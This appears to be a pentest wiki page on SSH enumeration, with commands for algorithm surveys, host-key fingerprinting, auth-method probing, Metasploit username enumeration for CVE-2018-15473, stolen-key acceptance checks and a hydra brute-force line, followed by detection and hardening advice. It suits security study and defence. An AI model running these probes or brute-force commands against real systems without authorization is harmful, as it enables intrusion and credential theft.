---
title: SSH enumeration
slug: ssh-enum
---

> **TL;DR:** TCP/22 leaks banner, KEX/cipher/MAC algorithms, host-key, and — on vulnerable OpenSSH builds — valid usernames via CVE-2018-15473 timing/oracle. Map auth methods and key fingerprints before any credential work.

## What it is
SSH banners advertise the implementation and version (`SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6`) and the server's algorithm preferences during the `SSH_MSG_KEXINIT` exchange. From those alone a triage matches the build to KEX-related CVEs (Terrapin CVE-2023-48795, [[terrapin-ssh-prefix-truncation]]), userauth CVEs (the 2018 enum oracle, the 2024 regreSSHion CVE-2024-6387 race-condition pre-auth RCE), and the server's auth posture (password, publickey, keyboard-interactive, GSSAPI). Host-key fingerprints identify cloned VMs and pivot opportunities.

## Preconditions / where it applies
- TCP/22 reachable. Custom ports are common — find them via [[port-scanning]] (`-sV` will tag any SSH banner).
- For user-enum CVE-2018-15473: OpenSSH ≤ 7.7. For regreSSHion: glibc-based Linux running 8.5p1–9.7 (with the GLib SIGALRM race).
- Related: [[ssh-tunneling]], [[port-forwarding]], [[known-cve-triage]].

## Technique
Banner + algorithm survey:

```bash
nmap -sV -p22 --script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods,ssh-publickey-acceptance TARGET
ssh-audit TARGET            # consolidated algorithm/security report
```

Pull host-key fingerprint and check for reuse across hosts (cloud golden-image leak, embedded device reuse):

```bash
ssh-keyscan -t rsa,ecdsa,ed25519 TARGET 2>/dev/null | tee keys.txt
ssh-keygen -lf keys.txt
```

Enumerate which auth methods the server offers — useful before sprays:

```bash
ssh -v -o PreferredAuthentications=none -o NoHostAuthenticationForLocalhost=yes TARGET 2>&1 | grep -i 'authentications that can continue'
```

Username enumeration on vulnerable OpenSSH (≤ 7.7) — a malformed `SSH2_MSG_USERAUTH_REQUEST` returns differently for valid vs invalid users. Metasploit `auxiliary/scanner/ssh/ssh_enumusers` automates it:

```text
msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 > set RHOSTS TARGET
msf6 > set USER_FILE users.txt
msf6 > run
```

Public-key acceptance probe — if an attacker has a stolen key, `ssh-publickey-acceptance` NSE confirms the server accepts a given public key for a user without needing the private half:

```bash
nmap -p22 --script=ssh-publickey-acceptance --script-args="ssh.usernames={root,admin,deploy},publickeys={/tmp/known.pub}" TARGET
```

Credential brute — last resort, noisy, and trips fail2ban:

```bash
hydra -L users.txt -P passwords.txt -t 4 ssh://TARGET
```

Map algorithm-driven CVEs: presence of `chacha20-poly1305@openssh.com` or `*-etm@openssh.com` MACs without the strict-kex extension → Terrapin-vulnerable. Old `diffie-hellman-group1-sha1`, `arcfour`, `cbc` ciphers → weak crypto findings.

## Detection and defence
- `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL) records every failed auth with source and method. Alert on bulk failures, on `PreferredAuthentications=none` probes, and on connections that EOF mid-handshake (algorithm scrapes).
- Harden: `PasswordAuthentication no`, `PermitRootLogin no`, key-only auth, restrict to bastion subnet, deploy `fail2ban` or `sshguard`, keep OpenSSH current, disable weak algorithms in `sshd_config` (`KexAlgorithms`, `Ciphers`, `MACs`).
- Use certificate-based authentication or a bastion with session recording; rotate host keys on cloned images.

## References
- [HackTricks — 22 SSH](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html) — enum and post-auth recipes.
- [ssh-audit](https://github.com/jtesta/ssh-audit) — algorithm/security posture reporter.
- [OpenSSH release notes](https://www.openssh.com/releasenotes.html) — definitive source for CVE-fix lineage.
